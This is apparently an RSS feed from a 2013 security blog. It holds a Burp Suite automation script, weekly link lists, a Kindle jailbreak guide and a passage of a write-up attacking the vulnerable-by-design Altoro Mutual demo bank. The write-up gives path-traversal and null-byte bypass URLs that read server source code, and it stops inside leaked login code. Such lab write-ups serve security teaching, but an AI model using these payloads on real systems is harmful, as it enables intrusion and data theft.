<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ java -jar ../jython.jar -Dpython.path=Lib/  run.py -B burpsuite_pro_v1.5.11.jar --send-to-spider http://dornea.nu --add-to-scope http://dornea.nu -i
</code></pre></div><p>Well I had some closer look at the *run.py *and modified it a little bit. This is what came out (own modifications have been highlighted):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># -*- coding: utf-8 -*-
from java.lang import System

from org.python.util import JLineConsole, PythonInterpreter

import logging
import os.path
import sys
import time
from threading import Thread

class MyThread(Thread):
    # Run own thread to get things done
    def __init__(self, burp, options):
        Thread.__init__(self, name=&#39;jython-console&#39;)
        self.opts   = options
        self.burp   = burp

    def run(self):
        from java.net import URL

        # Add new scope
        if self.opts.add_to_scope:
            self.burp.includeInScope(URL(self.opts.add_to_scope))
            print(&#34;[--] Added new scope ...&#34;)

        # Send URL to spider
        if self.opts.send_to_spider:
            self.burp.sendToSpider(URL(self.opts.send_to_spider))
            print(&#34;[--] Starting spider ...&#34;)

        # Start interactive jython console
        if self.opts.interactive:
            from java.util import Properties
            pre_properties = System.getProperties()
            pre_properties[&#39;python.console&#39;] = &#39;org.python.util.ReadlineConsole&#39;
            post_properties = Properties()

            PythonInterpreter.initialize(pre_properties, post_properties, [])

            # Attach threaded console to BurpExtender
            self.burp.console = console = JLineConsole()
            console.set(&#39;Burp&#39;, self.burp)

            try:
                self.burp.stdout.write(&#39;Launching interactive session...\n&#39;)
            except Exception:
                sys.stdout.write(&#39;Launching interactive session...\n&#39;)

            ConsoleThread(console).start()

def start_burp(options, *args):
    sys.path.extend([os.path.join(&#39;java&#39;, &#39;src&#39;), options.burp])

    from burp_extender import BurpExtender as MyBurpExtender, ConsoleThread
    from burp import StartBurp
    from pprint import pprint
    import BurpExtender

    from gds.burp.config import Configuration

    if options.debug:
        logging.basicConfig(
            filename=&#39;jython-burp.log&#39;,
            format=&#39;%(asctime)-15s - %(levelname)s - %(message)s&#39;,
            level=logging.DEBUG)

    elif options.verbose:
        logging.basicConfig(
            filename=&#39;jython-burp.log&#39;,
            format=&#39;%(asctime)-15s - %(levelname)s - %(message)s&#39;,
            level=logging.INFO)

    else:
        logging.basicConfig(
            filename=&#39;jython-burp.log&#39;,
            format=&#39;%(asctime)-15s - %(levelname)s - %(message)s&#39;,
            level=logging.WARN)

    # Set the BurpExtender handler to the Pythonic BurpExtender
    Burp = MyBurpExtender()
    Burp.config = Configuration(os.path.abspath(opt.config))
    Burp.opt = options
    Burp.args = args

    BurpExtender.setHandler(Burp)
    StartBurp.main(args)

    # In latest Burp, callbacks might not get registered immediately
    while not Burp.cb:
        time.sleep(0.1)

    # Disable Burp Proxy Interception on startup
    Burp.setProxyInterceptionEnabled(False)

    # Check for options and start new thread(s)
    MyThread(Burp, options).start()

if __name__ == &#39;__main__&#39;:
    from optparse import OptionParser
    parser = OptionParser()

    parser.add_option(&#39;-B&#39;, &#39;--load-burp&#39;, dest=&#39;burp&#39;,
                      help=&#39;Load Burp Jar from PATH&#39;, metavar=&#39;PATH&#39;)

    parser.add_option(&#39;-i&#39;, &#39;--interactive&#39;,
                      action=&#39;store_true&#39;,
                      help=&#39;Run Burp in interactive mode (Jython Console)&#39;)

    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, metavar=&#39;FILE&#39;,
                      help=&#39;Restore Burp state from FILE on startup&#39;)

    parser.add_option(&#39;-d&#39;, &#39;--debug&#39;,
                      action=&#39;store_true&#39;,
                      help=&#39;Set log level to DEBUG&#39;)

    parser.add_option(&#39;-v&#39;, &#39;--verbose&#39;,
                      action=&#39;store_true&#39;,
                      help=&#39;Set log level to INFO&#39;)

    parser.add_option(&#39;-P&#39;, &#39;--python-path&#39;,
                      default=&#39;&#39;,
                      help=&#39;Set PYTHONPATH used by Jython&#39;)

    parser.add_option(&#39;-C&#39;, &#39;--config&#39;,
                      default=&#39;burp.ini&#39;,
                      help=&#39;Specify alternate jython-burp config file&#39;)

    parser.add_option(&#39;--disable-reloading&#39;,
                      action=&#39;store_true&#39;,
                      help=&#39;Disable hot-reloading when a file is changed&#39;)

    parser.add_option(&#39;--send-to-spider&#39;, type=str, help=&#39;Send URL to spider&#39;)
    parser.add_option(&#39;--add-to-scope&#39;, type=str, help=&#39;Add URL to scope&#39;)

    opt, args = parser.parse_args()

    if not opt.burp:
        print(&#39;Load Burp Error: Specify a path to your burp.jar with -B&#39;)
        parser.print_help()
        sys.exit(1)

    start_burp(opt, *args)
</code></pre></div><p>Now I can easily automate following steps:</p>
<ul>
<li>send some URL to the spider</li>
<li>add URL to the scope</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ java -jar ../jython.jar -Dpython.path=Lib/  testing.py -B burpsuite_pro_v1.5.11.jar --send-to-spider http://heise.de --add-to-scope http://heise.de -i 
[--] Added new scope ...
[--] Starting spider ...
...
</code></pre></div><p>The above code is just a PoC. Maybe I&rsquo;ll extend it to some features like</p>
<ul>
<li>logging (specify format)</li>
<li>tamper requests before being sent</li>
<li>export results (XML)</li>
<li>write results to some DB</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the week 7</title>
      <link>https://blog.dornea.nu/2013/07/12/links-of-the-week-7/</link>
      <pubDate>Fri, 12 Jul 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/07/12/links-of-the-week-7/</guid>
      <content:encoded><![CDATA[<ol>
<li><a href="https://www.corelan.be/index.php/2013/07/02/root-cause-analysis-integer-overflows/">Root Cause Analysis Integer Overflows</a>: Nice analysis!</li>
<li><a href="http://neverfear.org/blog/view/3/Secure_website_authentication_using_GPG_keys">Nginx just became the most used web server among the top 1000 websites</a>: Glad to hear that!</li>
<li><a href="http://blog.jackdb.com/post/54435480893/proper-ssl-a-repository-of-ssl-best-practices">Hacking Java Bytecode for Programmers (Part4) Krakatau And The Case Of The Integer Overflow</a>: The 4th part is online! This time dealing with integer overflows&hellip;</li>
<li><a href="http://neverfear.org/blog/view/3/Secure_website_authentication_using_GPG_keys">Secure website-authentication using GPG keys</a>: Nice idea but lacks of proper secure implementation.</li>
<li><a href="http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/">Uncovering Android Master Key That Makes 99% of Devices Vulnerable</a>: Sort of link of the week!</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Root your Kindle 3</title>
      <link>https://blog.dornea.nu/2013/07/03/howto-root-your-kindle-3/</link>
      <pubDate>Wed, 03 Jul 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/07/03/howto-root-your-kindle-3/</guid>
      <content:encoded><![CDATA[<p>As I&rsquo;m using my Kindle 3 on daily basis I wanted to go behind the limits and check for some new features. As an entry point to the whole topic I highly recommend you <a href="http://wiki.mobileread.com/wiki/K3_Index">K3_Index</a>. This is what I did:</p>
<h2 id="step-1-jailbreak">Step 1: Jailbreak</h2>
<p>Download the files from <a href="http://www.mobileread.com/forums/showthread.php?t=88004">http://www.mobileread.com/forums/showthread.php?t=88004</a>. In my case I&rsquo;ve used <strong>update_jailbreak_0.11.N_k3w_install.bin</strong>. Copy this file to your Kindle, unplug it from the PC and run: <code>[HOME] -&gt; [MENU] &gt; Settings -&gt; [MENU] &gt; Update YourÃ‚Â  Kindle.</code></p>
<h2 id="step-2-install-launchpad">Step 2: Install launchpad</h2>
<blockquote>
<p>&ldquo;launchpad for Kindle is a small program supporting extended input capabilities. * * The main purpose of it is providing the ability to run any 3rd-party programs* * from within the original unmodified Kindle Framework software.* * It can be also used to organize custom keyboard shortcut operations and* * to simplify input of special symbols&hellip; (Source: <a href="http://www.mobileread.com/forums/showthread.php?t=97636">http://www.mobileread.com/forums/showthread.php?t=97636</a>)&rdquo;</p>
</blockquote>
<p>I&rsquo;ve downloaded the package and copied **update_launchpad_0.0.1c_k3w_install.binÂ **to the device. Afterwards the same procedure: Unplug your Kindle and run <code>[HOME] -&gt; [MENU] &gt; Settings -&gt; [MENU] &gt; Update Your Kindle</code></p>
<h2 id="step-3-install-pdf-reader">Step 3: Install PDF reader</h2>
<p>You could use this wonderful <a href="http://www.mobileread.mobi/forums/showthread.php?t=190641">unofficial guide</a>. You can choose between:</p>
<ul>
<li><a href="https://github.com/koreader/kindlepdfviewer">kindlepdfreader</a> (download <a href="https://github.com/koreader/kindlepdfviewer/wiki/Download">here</a> the latest version)</li>
<li><a href="https://github.com/kai771/kindlepdfviewer/tree/librerator">librerator</a> (a quite neat fork of kindlepdfreader)</li>
</ul>
<p>As already described <a href="http://www.mobileread.com/forums/showthread.php?t=157047">here</a> follow these steps:</p>
<ul>
<li>You need to jailbreak and install launchpad first</li>
<li>Create a folder <code>customupdates</code> on the exported Kindle drive, if not yet present</li>
<li>Copy a release ZIP file into the folder <code>customupdates</code></li>
<li>Press Shift-Shift-I sequence on the Kindle for installing (if this is the first time you use launchpad: you only have 0.7 secs for the sequence!)</li>
<li>Press Shift-Shift-Space sequence on the Kindle to reload launchpad</li>
<li>done! now you can run the viewer via a <strong>Shift-P-D</strong> sequence.</li>
</ul>
<p>The same applies to <strong>librerator</strong> too. Instead of Shift-P-D use <strong>Shift-L-L</strong>.</p>
<p>[<img alt="Calculator" src="http://static.dornea.nu/img/2013/0a569c30e50de6eb56f1527a4135eb17.gif" width="50%" height="800" />][7][<img alt="KUAL not working" src="http://static.dornea.nu/img/2013/5b32f0bf9df20c3454d6f49ef58649d8.gif" width="50%" height="800" />][8]</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 6</title>
      <link>https://blog.dornea.nu/2013/06/28/links-of-the-week-6/</link>
      <pubDate>Fri, 28 Jun 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/06/28/links-of-the-week-6/</guid>
      <content:encoded><![CDATA[<p>This weeks links:</p>
<ol>
<li><a href="http://julipedia.meroh.net/2013/06/self-interview-after-leaving-netbsd.html">Self interview after leaving the NetBSD board</a>: I still like NetBSD a lot but what Julio writes in his blog makes me feel sad about the whole project.</li>
<li><a href="http://raspberrycolocation.com/">Free Raspberry Pi Hosting</a>: Really interesting idea. I can&rsquo;t wait to see some day a whole P2P network build upon raspberry pi&rsquo;s.</li>
<li><a href="http://www.google.com/trends/hottrends/visualize?nrow=10&amp;ncol=10">Google Trends</a>: Get a real-time view on what&rsquo;s being searched on Google right now. Really impressive!</li>
<li><a href="http://pcottle.github.io/learnGitBranching/">Learn Git Branching</a>: Learn how Git&rsquo;s branching really works. Also learn more about the concepts behind Git.</li>
<li>
<p id="watch-headline-title">
  <a href="https://www.youtube.com/watch?feature=player_detailpage&v=U4oB28ksiIo#t=196s">Defcon 18 Pwned By the owner What happens when you steal a hackers computer</a>: Don't fuck with a hacker's machine!
</p>
</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Dinge, die ein Informatikerstudent niemals sagen wÃ¼rde</title>
      <link>https://blog.dornea.nu/2013/06/26/dinge-die-ein-informatikerstudent-niemals-sagen-w%C3%BCrde/</link>
      <pubDate>Wed, 26 Jun 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/06/26/dinge-die-ein-informatikerstudent-niemals-sagen-w%C3%BCrde/</guid>
      <content:encoded><![CDATA[<p>Dinge, die ein informatikstudent niemals sagen wÃ¼rde:</p>
<ul>
<li>
<ul>
<li>ich hab sonnenbrand</li>
</ul>
</li>
<li>
<ul>
<li>meine freundin&hellip;</li>
</ul>
</li>
<li>
<ul>
<li>&hellip;lass uns das mit pointern lÃ¶sen</li>
</ul>
</li>
<li>
<ul>
<li>yey, ein beweis!</li>
</ul>
</li>
<li>
<ul>
<li>ich weiÃŸ, warum mein programm funktioniert</li>
</ul>
</li>
<li>
<ul>
<li>ich entwickel erst einmal ein ausfÃ¼hrliches konzept und denke an alle mÃ¶lichen fehlerfÃ¤lle, bevor ich auch nur eine zeile programmiere</li>
</ul>
</li>
<li>
<ul>
<li>ich hab windows und office legal gekauft</li>
</ul>
</li>
<li>
<ul>
<li>der typ vor mir duftet aber gut</li>
</ul>
</li>
<li>
<ul>
<li>heute kommentiere ich ausfÃ¼hrlich</li>
</ul>
</li>
<li>
<ul>
<li>das internet benÃ¶tige ich nie zum programmieren</li>
</ul>
</li>
<li>
<ul>
<li>wirtschaftsinformatik ist ein vÃ¶llig gleichwertiger studiengang zu informatik</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 5</title>
      <link>https://blog.dornea.nu/2013/06/21/links-of-the-week-5/</link>
      <pubDate>Fri, 21 Jun 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/06/21/links-of-the-week-5/</guid>
      <content:encoded><![CDATA[<p>This weeks top links:</p>
<ol>
<li><a href="http://www.securelist.com/en/blog/8106/The_most_sophisticated_Android_Trojan?utm_source=feedly">The most sophisticated Android Trojan</a>: Really nice analysis. I think security on mobile devices will become more and more <code>hype</code>.</li>
<li><a href="http://venturebeat.com/2013/06/07/at-our-current-rate-of-progress-ipv6-will-be-fully-implemented-on-may-10-2048/?utm_source=feedly">At our current rate of progress, IPv6 will be fully implemented on May 10,Â 2148</a>: `There is no reason for any individual to have a computer in his home. Well.. Not really!</li>
<li><a href="http://www.eecis.udel.edu/~bmiller/cis459/2007s/readings/buff-overflow.html">Writing buffer overflow exploits - a tutorial for beginners</a>: Another buffer overflow tutorial.</li>
<li><a href="http://forum.hitb.org/viewtopic.php?f=1&amp;t=17925">Buffer Overflows - Nopsled and Ret2Libc methods</a>: Just excellent!</li>
<li><a href="http://al3x.net/2013/05/23/letter-to-a-young-programmer.html?src=longreads&amp;utm_source=feedly">Letter To A Young Programmer Considering A Startup</a>: Alex, nice thoughts you got there!</li>
<li><a href="https://github.com/epsylon/ufonet">epsylon / ufonet</a>: <code>UFONet - is a shell client designed to launch DDoS attacks against a target, using CSRF/XSS vectors on third party web applications, like botnet.</code></li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 4</title>
      <link>https://blog.dornea.nu/2013/06/07/links-of-the-week-4/</link>
      <pubDate>Fri, 07 Jun 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/06/07/links-of-the-week-4/</guid>
      <content:encoded><![CDATA[<ol>
<li>
<p><a href="http://news.nationalgeographic.com/news/2013/05/130526-astronomy-nautical-navigation-space-longitude-moon-science/?utm_source=feedly">How the Prime Meridian Changed the World</a>: Not technical stuff but worth reading.</p>
</li>
<li>
<p><a href="http://pthree.org/2013/05/30/openssh-keys-and-the-drunken-bishop/">OpenSSH keys and the drunken bishop</a>: Ever wondered about that visual fingerprint when generating SSH keys? Well this article brings some light on that. I&rsquo;ve tried on my own and that&rsquo;s fun: <pre class="lang:default decode:true">$ ssh -o VisualHostKey=yes <a href="mailto:victor@cia.gov">victor@cia.gov</a> -p 1337
Host key fingerprint is xxxxx
+&ndash;[ RSA 2048]&mdash;-+
|        ..       |
|  .    ..        |
| o  . o. .       |
|. o. o =o        |
| o..  =.S        |
|&hellip;  &hellip;         |
|o=.   ..         |
|Eo.  .  .        |
| .o.  ..         |
+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</pre></p>
</li>
<li>
<p><a href="http://virtuecenter.com/blog/the_effects_of_computer_programming_on_the_brain.html">The effects of computer programming on the brain</a>: I should be worried about that. Are *YOUÂ *addicted to programming? Just in case, let me know&hellip;</p>
</li>
<li>
<p><a href="http://www.blackhatlibrary.net/Shellcodecs">http://www.blackhatlibrary.net/Shellcodecs</a>: Useful collection.</p>
</li>
<li>
<p><a href="http://scottlinux.com/2013/06/02/use-google-authenticator-for-two-factor-ssh-authentication-in-linux">Use Google Authenticator For Two-Factor SSH Authentication in Linux:</a> Add 2-factor authentication to your SSH linux server. 2-Factor auth seems to be quite trendy these days&hellip;</p>
</li>
<li>
<p><a href="http://seclists.org/fulldisclosure/2013/Jun/8">Call For Papers - Balkan Computer Congress 2013</a>: My favourite anecdote related to this one: <code>... and because we're from Eastern Europe we like break things and stuff.</code> (some SAP guy :-))</p>
</li>
<li>
<p><a href="http://tkf.github.io/2013/06/04/Emacs-is-dead.html">Emacs is dead</a>: Old but worth mentioning it. I&rsquo;ve never used Emacs btw. I&rsquo;m a VIM lover since my birth.</p>
</li>
<li>
<p><a href="http://al3x.net/2013/05/23/letter-to-a-young-programmer.html">Letter To A Young Programmer Considering A Startup</a>: <code>*I regularly get emails from young people, usually those with an interest in programming, who are trying to make decisions about school and/or their professional futures. This post is for those young people.*</code></p>
</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 3</title>
      <link>https://blog.dornea.nu/2013/05/31/links-of-the-week-3/</link>
      <pubDate>Fri, 31 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/31/links-of-the-week-3/</guid>
      <content:encoded><![CDATA[<ol>
<li><a href="http://arstechnica.com/security/2013/05/how-crackers-make-minced-meat-out-of-your-passwords/">Anatomy of a hack: How crackers ransack passwords like qeadzcwrsfxv1331 </a>This is definetely <strong>link of the month</strong>! I never had to crack hashes in my life but this article is way the best introduction to the cracking/brute-forcing techniques. This is a must for all crackers out there (Thanks Marcin for the link).</li>
<li><a href="http://www.acloudtree.com/yes-disassemble-with-javap-all-over-the-place-hacking-java-bytecode-for-programmers-part3/">Yes, disassemble with Javap ALL OVER THE PLACE! Hacking Java Bytecode for Programmers (Part3):</a> If the site is down check out this <a href="http://getpocket.com/a/read/367684129">link</a>. This guy diassembles java class files and analyzes opcodes. That&rsquo;s fucking cool! This is also a good introduction to bytecode analysis.</li>
<li><a href="https://medium.com/this-happened-to-me/8f381aa6bd5e">Four steps to Google, without a Degree:</a> After his <a href="https://medium.com/tech-talk/d5f8051afce2">ABC: Always Be Coding - How to Land an Engineering Job</a> David Byttow gives you a somehow interesting view how you could apply to job at Google. If everything would be that easy&hellip;</li>
<li><a href="http://www.spectrumcoding.com/tutorials/exploits/2013/05/27/buffer-overflows.html">Introduction to Buffer Overflows:</a> I know what you might think..<code>C'mon.. I've seen thousands of tutorials/papers like that.</code> You *mightÂ *be right but you also *might *miss one of the most comprehensive and visually (!) introduction to buffer overflows. BTW: <code>Your mother is so fat, the recursive function computing her mass causes a stack overflow.</code> &lt;- You gotta love this one!</li>
<li><a href="http://llbit.se/?p=1744">The Shortest Crashing C Program</a>: A lot of people have to much free time.</li>
<li><a href="http://martin.kleppmann.com/2013/05/24/improving-security-of-ssh-private-keys.html">Improving the security of your SSH private key files:</a> Well this article made me think about some things&hellip; Let me summarize that in one sentence: <em>1 Iteration for hashing using MD5 is way to insecure</em>! Switch to <a href="http://www.rsa.com/rsalabs/node.asp?id=2130%25">PKCS#8</a> <em>now</em>!</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 2</title>
      <link>https://blog.dornea.nu/2013/05/24/links-of-the-week-2/</link>
      <pubDate>Fri, 24 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/24/links-of-the-week-2/</guid>
      <content:encoded><![CDATA[<ol>
<li><a href="http://www.kwartzlab.ca/2013/05/first-glimpse-soul-tamagotchi/" target="_blank">First Glimpse into the Soul of Tamagotchi</a>: Remember my post about <a href="http://dornea.nu/blog/2012/12/29c3" target="_blank">29C3</a>? There I&rsquo;ve first mentioned Natalie and her passion for Tamagotchis. She&rsquo;s doing some progress! Obvisouly! I really like the screenshots.</li>
<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2094">CVE-2013-2094</a>: This is definitely the <strong>bug of the week</strong>! Have a closer detailed look <a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/">here</a>. The exploit was ported to <a href="http://rikiji.it/2013/05/10/CVE-2013-2094-x86.html">x86</a>.</li>
<li>Interview with a BlackHat: <a href="https://blog.whitehatsec.com/interview-with-a-blackhat-part-1/">Part 1</a>, <a href="https://blog.whitehatsec.com/interview-with-a-blackhat-part-2/#.UZ9JX8LX5xA">Part 2</a>, <a href="https://blog.whitehatsec.com/interview-with-a-blackhat-part-3/">Part 3</a></li>
<li><a href="http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html?m=1" target="_blank">Your login form posts to HTTPS, but you blew it when you loaded it over HTTP</a>: I can&rsquo;t believe this is still a issue. In 2013!</li>
<li><a href="http://www.theregister.co.uk/2013/05/17/romanian_hacker_atm_security/" target="_blank">Jailed Romanian hacker repents, invents ATM security scheme</a>: I&rsquo;d call that: Twist of fate!</li>
<li><a href="http://www.highexistence.com/10-reasons-you-should-never-get-a-job%25">10 reasons you should never get a job</a>: Don&rsquo;t get me wrong but this article is full of provocative ideas and preconceptions.</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Introducing Links of the Week (LOW) 1</title>
      <link>https://blog.dornea.nu/2013/05/17/introducing-links-of-the-week-low-1/</link>
      <pubDate>Fri, 17 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/17/introducing-links-of-the-week-low-1/</guid>
      <content:encoded><![CDATA[<ol>
<li><a title="A binary analysis, count me if you can" href="http://shell-storm.org/blog/A-binary-analysis-count-me-if-you-can/" target="_blank">A binary analysis, count me if you can:</a> Really impressive skills! See how cracking can be a lot of fun!</li>
<li><a title="Attackvector Linux" href="https://github.com/ksoona/attackvector" target="_blank">AttackVector Linux:</a> Combine BackTrack/Kali, TOR and Tails for high anonymity. I liked that one: <code>*Nmap can't UDP via Tor*</code></li>
<li><a href="http://www.h-online.com/security/news/item/Skype-with-care-Microsoft-is-reading-everything-you-write-1862870.html" target="_blank">Skype Big Brother Microsoft is watching you:</a> You should take that into consideration before having your next Skype session.</li>
<li><a href="http://blog.gdssecurity.com/labs/2013/5/8/writing-an-xss-worm.html" target="_blank">Writing a XSS Worm: </a>Really nice one<a href="http://www.reddit.com/r/netsec/comments/1djmhv/hackersh_020_released/" target="_blank">!</a></li>
<li><a href="http://www.reddit.com/r/netsec/comments/1djmhv/hackersh_020_released/" target="_blank">Hackersh 0.2 released:</a> You should definitely give it a try!</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Hacking Altoro Mutual</title>
      <link>https://blog.dornea.nu/2013/05/06/hacking-altoro-mutual/</link>
      <pubDate>Mon, 06 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/05/06/hacking-altoro-mutual/</guid>
      <content:encoded><![CDATA[<h2 id="introduction">Introduction</h2>
<p>AltoroMutual is an vulnerable-by-design web application created by WatchFire (nowÂ AppScan Standard) as a demo test application for their BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
<p>The demo can be found atÂ <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
<h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="defaultaspxcontent">/default.aspx?content=</h3>
<p>There is a <strong>file inclusion vulnerability</strong> which we&rsquo;ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">An Error Has Occurred
Summary:
Could not find file &#39;D:downloadsAltoroMutual_v6website  esting.txt&#39;.
Error Message:
System.IO.FileNotFoundException: Could not find file &#39;D:downloadsAltoroMutual_v6website esting.txt&#39;. File name: &#39;D:downloadsAltoroMutual_v6website  esting.txt&#39; at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</code></pre></div><p>As you can see we have found the root path of the web application which is at <code>D:downloads!AltoroMutual_v6website</code>.</p>
<h2 id="bank">/bank</h2>
<hr>
<p>You&rsquo;ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"> 5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
 1/12/2011 10:14 PM         1831 account.aspx
 1/12/2011 10:14 PM         4277 account.aspx.cs
 1/12/2011 10:14 PM          771 apply.aspx
 1/12/2011 10:14 PM         2828 apply.aspx.cs
 1/12/2011 10:14 PM         2236 bank.master
 1/12/2011 10:14 PM         1134 bank.master.cs
 1/12/2011 10:14 PM          904 customize.aspx
 1/12/2011 10:14 PM         1955 customize.aspx.cs
 1/12/2011 10:14 PM         1806 login.aspx
 1/12/2011 10:14 PM         5847 login.aspx.cs
 1/12/2011 10:14 PM           78 logout.aspx
 1/12/2011 10:14 PM         3361 logout.aspx.cs
 1/12/2011 10:14 PM          935 main.aspx
 1/12/2011 10:14 PM         3951 main.aspx.cs
 5/31/2007 11:10 AM        &lt;dir&gt; members
 1/12/2011 10:14 PM         1414 mozxpath.js
 6/21/2011 10:29 PM          779 queryxpath.aspx
 1/12/2011 10:14 PM         1838 queryxpath.aspx.cs
 1/12/2011 10:14 PM          499 servererror.aspx
 1/12/2011 10:14 PM         1700 transaction.aspx
 1/12/2011 10:14 PM         3826 transaction.aspx.cs
 1/12/2011 10:14 PM         3930 transfer.aspx
 1/12/2011 10:14 PM         3505 transfer.aspx.cs
 1/12/2011 10:14 PM           82 ws.asmx
</code></pre></div><p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">An Error Has Occurred
Summary:
An unknown error occurred.
Error Message:
</code></pre></div><p>So you&rsquo;ll have to find another way to get to the files. We&rsquo;ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a>Â will result in</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Error! File must be of type TXT or HTM
</code></pre></div><p>We&rsquo;ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
<p>That will show you the content ofÂ <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
<h2 id="bankloginaspx">/bank/login.aspx</h2>
<p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">using System.Data;
using System.Data.SqlClient;
using System.Data.OleDb;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
  public partial class Authentication : Page
  {
    protected void Page_Load(object sender, System.EventArgs e)
    {
      // Put user code to initialize the page here
      Response.Cache.SetCacheability(HttpCacheability.NoCache);
      HtmlMeta meta = new HtmlMeta();
      HtmlHead head = (HtmlHead)Page.Header;
      meta.Name = &#34;keywords&#34;;
      meta.Content = &#34;Altoro Mutual Login, login, authenticate&#34;;
      head.Controls.Add(meta);
      if(Request.Params[&#34;passw&#34;] != null)
      {
        String uname = Request.Params[&#34;uid&#34;];
        String passwd = Request.Params[&#34;passw&#34;];
        String msg = ValidateUser(uname, passwd);
        if (msg == &#34;Success&#34;)
        {
            Response.Redirect(&#34;main.aspx&#34;);
        }
        else
        {
          message.Text = &#34;Login Failed: &#34; + msg;
        }
      }
